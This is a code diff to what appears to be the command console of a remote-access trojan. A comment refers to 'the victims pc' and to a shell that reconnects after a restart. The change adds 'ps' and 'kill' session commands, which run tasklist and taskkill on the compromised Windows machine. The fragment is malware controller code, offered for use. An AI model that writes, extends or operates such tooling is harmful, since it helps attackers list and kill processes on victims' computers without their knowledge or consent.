@@ -21,7 +21,7 @@ session_ids = []
 
 # saves all the command
 COMMANDS = ["help", "sessions"]
-SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect"]
+SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill"]
 
 
 class Commands:
@@ -176,6 +176,18 @@ class Commands:
             else:
                 print("Those are too many arguments only one is allowed")
                 return
+        elif message == "ps":
+            print(sendMessage("c o tasklist"))
+        elif message == "kill":
+            # taskkill /im
+            if args:
+                try:
+                    args = int(args[0])
+                except ValueError:
+                    print("you need to enter a pid(number)")
+                    return
+                sendMessage(f"c x taskkill /im {args}")
+
         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
             sendMessage("!dsc")
